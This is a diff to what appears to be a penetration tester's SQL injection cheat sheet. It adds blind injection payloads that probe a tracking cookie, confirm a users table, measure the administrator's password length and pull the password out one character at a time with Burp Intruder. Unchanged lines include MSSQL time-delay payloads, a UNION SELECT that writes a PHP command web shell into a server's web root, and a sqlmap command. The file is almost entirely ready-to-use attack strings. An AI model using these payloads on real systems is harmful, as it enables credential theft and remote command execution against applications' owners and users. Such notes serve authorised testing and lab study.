@@ -1141,11 +1141,23 @@ select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir;
 'UNION SELECT "<?php echo passthru($_GET['cmd']);?>" INTO OUTFILE 'C:/xampp/htdocs/command.php'>) #MedJed
 
 # Blind Enumeration (https://auspisec.com/blog/20220118/proving_grounds_butch_walkthrough.html)
+TrackingId =u5YD3PapBcR4lN3e7Tj4' AND '1'='1    #Test w/ a condition based injection (True or False)
+
 ' IF (1=1) WAITFOR DELAY '0:0:10';--  #Evaluates to true and waits 10 secs
 
 ' IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--  #This query uses Boolean to guess the table name of a database
 
 ' IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';-- #This query uses Boolean to guess the column name of a table
+
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a #This query verifies there is table called users.
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a  #Checks for password length
+
+TrackingId=xyz' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='§a§  #Use with Burp Sniper, a Simple List Payload, and Grep Match to find the password one character at a time incrementing to total length.
+
+TrackingId =u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm #This query checks to narrow the first letter of the 'Admin' password
+
+
 
 # Post
 ./sqlmap.py -r search-test.txt -p tfUPass  #<-p> is the parameter to test in the file
